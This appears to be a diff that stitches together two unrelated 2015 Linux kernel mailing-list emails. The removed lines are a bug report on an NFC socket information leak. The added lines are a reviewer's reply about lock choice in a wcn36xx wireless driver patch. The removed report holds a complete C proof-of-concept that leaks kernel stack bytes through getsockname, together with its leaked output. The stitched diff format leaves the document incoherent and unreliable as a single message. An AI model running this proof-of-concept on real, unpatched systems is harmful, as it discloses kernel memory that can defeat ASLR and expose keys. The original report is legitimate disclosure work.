@@ -1,87 +1,50 @@
 Return-path: <linux-wireless-owner@vger.kernel.org>
-Received: from mail-wm0-f52.google.com ([74.125.82.52]:36510 "EHLO
-	mail-wm0-f52.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-	with ESMTP id S932080AbbLOUAl (ORCPT
+Received: from mail-pa0-f41.google.com ([209.85.220.41]:36226 "EHLO
+	mail-pa0-f41.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
+	with ESMTP id S1752680AbbL1XG1 (ORCPT
 	<rfc822;linux-wireless@vger.kernel.org>);
-	Tue, 15 Dec 2015 15:00:41 -0500
-Received: by mail-wm0-f52.google.com with SMTP id n186so181070191wmn.1
-        for <linux-wireless@vger.kernel.org>; Tue, 15 Dec 2015 12:00:41 -0800 (PST)
+	Mon, 28 Dec 2015 18:06:27 -0500
+Received: by mail-pa0-f41.google.com with SMTP id yy13so23256672pab.3
+        for <linux-wireless@vger.kernel.org>; Mon, 28 Dec 2015 15:06:26 -0800 (PST)
+Date: Mon, 28 Dec 2015 15:06:35 -0800
+From: Stephen Hemminger <stephen@networkplumber.org>
+To: Bjorn Andersson <bjorn@kryo.se>
+Cc: Eugene Krasnikov <k.eugene.e@gmail.com>,
+	Kalle Valo <kvalo@codeaurora.org>, fengwei.yin@linaro.org,
+	linux-arm-msm@vger.kernel.org, linux-kernel@vger.kernel.org,
+	linux-wireless@vger.kernel.org, netdev@vger.kernel.org,
+	wcn36xx@lists.infradead.org
+Subject: Re: [PATCH 2/4] wcn36xx: Change indication list lock to spinlock
+Message-ID: <20151228150635.79181f6e@xeon-e3> (sfid-20151229_000645_751746_8E2BD2C5)
+In-Reply-To: <1451266467-15377-3-git-send-email-bjorn.andersson@sonymobile.com>
+References: <1451266467-15377-1-git-send-email-bjorn.andersson@sonymobile.com>
+	<1451266467-15377-3-git-send-email-bjorn.andersson@sonymobile.com>
 MIME-Version: 1.0
-From: Dmitry Vyukov <dvyukov@google.com>
-Date: Tue, 15 Dec 2015 21:00:20 +0100
-Message-ID: <CACT4Y+bjSFyXZi1PKTUsT9PhAYvCGiGjRkOBRbUON0Pw7rJxGg@mail.gmail.com> (sfid-20151215_210123_567295_5E961ED2)
-Subject: Information leak in llcp_sock_bind/llcp_raw_sock_bind
-To: Lauro Ramos Venancio <lauro.venancio@openbossa.org>,
-	Aloisio Almeida Jr <aloisio.almeida@openbossa.org>,
-	"David S. Miller" <davem@davemloft.net>,
-	Samuel Ortiz <sameo@linux.intel.com>,
-	linux-wireless@vger.kernel.org, netdev <netdev@vger.kernel.org>,
-	LKML <linux-kernel@vger.kernel.org>
-Cc: syzkaller <syzkaller@googlegroups.com>,
-	Eric Dumazet <edumazet@google.com>,
-	Kostya Serebryany <kcc@google.com>,
-	Alexander Potapenko <glider@google.com>,
-	Sasha Levin <sasha.levin@oracle.com>
-Content-Type: text/plain; charset=UTF-8
+Content-Type: text/plain; charset=US-ASCII
 Sender: linux-wireless-owner@vger.kernel.org
 List-ID: <linux-wireless.vger.kernel.org>
 
-Hello,
+On Sun, 27 Dec 2015 17:34:25 -0800
+Bjorn Andersson <bjorn@kryo.se> wrote:
 
-The following program leads to leak of unint bytes from kernel stack:
+> In preparation for handling incoming messages from IRQ context, change
+> the indication list lock to a spinlock
+> 
+> Signed-off-by: Bjorn Andersson <bjorn.andersson@sonymobile.com>
+> ---
+>  drivers/net/wireless/ath/wcn36xx/smd.c     | 12 ++++++------
+>  drivers/net/wireless/ath/wcn36xx/wcn36xx.h |  2 +-
+>  2 files changed, 7 insertions(+), 7 deletions(-)
+> 
+> diff --git a/drivers/net/wireless/ath/wcn36xx/smd.c b/drivers/net/wireless/ath/wcn36xx/smd.c
+> index 6b5dbe6f0d0a..4307429740a9 100644
+> --- a/drivers/net/wireless/ath/wcn36xx/smd.c
+> +++ b/drivers/net/wireless/ath/wcn36xx/smd.c
+> @@ -2165,10 +2165,10 @@ static void wcn36xx_smd_rsp_process(struct wcn36xx *wcn, void *buf, size_t len)
+>  		msg_ind->msg_len = len;
+>  		memcpy(msg_ind->msg, buf, len);
+>  
+> -		mutex_lock(&wcn->hal_ind_mutex);
+> +		spin_lock(&wcn->hal_ind_lock);
 
-#include <sys/types.h>
-#include <sys/socket.h>
-#include <linux/in.h>
-#include <linux/in6.h>
-#include <linux/socket.h>
-#include <linux/if.h>
-#include <errno.h>
-#include <stdio.h>
-#include <string.h>
-#include <unistd.h>
-#include <sys/stat.h>
-#include <fcntl.h>
-
-#define NFC_SOCKPROTO_LLCP 1
-
-int main(void)
-{
-        struct sockaddr sa;
-        unsigned len, i, try;
-        int fd;
-
-        for (try = 0; try < 3; try++) {
-                fd = socket(AF_NFC, 3, NFC_SOCKPROTO_LLCP);
-                if (fd == -1)
-                        return;
-                switch (try) {
-                case 0:
-                        break;
-                case 1:
-                        sched_yield();
-                        break;
-                case 2:
-                        open("/dev/null", O_RDONLY);
-                }
-                memset(&sa, 0, sizeof(sa));
-                sa.sa_family = AF_NFC;
-                bind(fd, &sa, 2);
-                len = sizeof(sa);
-                getsockname(fd, &sa, &len);
-                for (i = 0; i < len; i++)
-                        printf("%02x", ((unsigned char*)&sa)[i]);
-                printf("\n");
-        }
-        return 0;
-}
-
-Output:
-27000000000000000000000000000000b002400000000000001f4511e5e38f900000000000000000b00240000000000018006c00000000007c134000000000000000000000000000000000000100000028f77610fe7f00005e10400000000000
-27000000000000000000000000000000b002400000000000000212046c1647690000000000000000b00240000000000018006c00000000007c1340000000000000000000000000000000000001000000c874fff4fe7f00005e10400000000000
-27000000000000000000000000000000b002400000000000008e8a91e4e069fc0000000000000000b00240000000000018006c00000000007c1340000000000000000000000000000000000001000000f868b3f2fe7f00005e10400000000000
-
-The problem is that llcp_sock_bind/llcp_raw_sock_bind do not check
-sockaddr_len passed in, so they copy stack garbage from stack into the
-socket and then return it in getsockname.
-This can defeat ASLR, leak crypto keys, etc.
+If you are going to handle messages in IRQ context, that better be a spin_lock_irq() or spin_lock_bh().
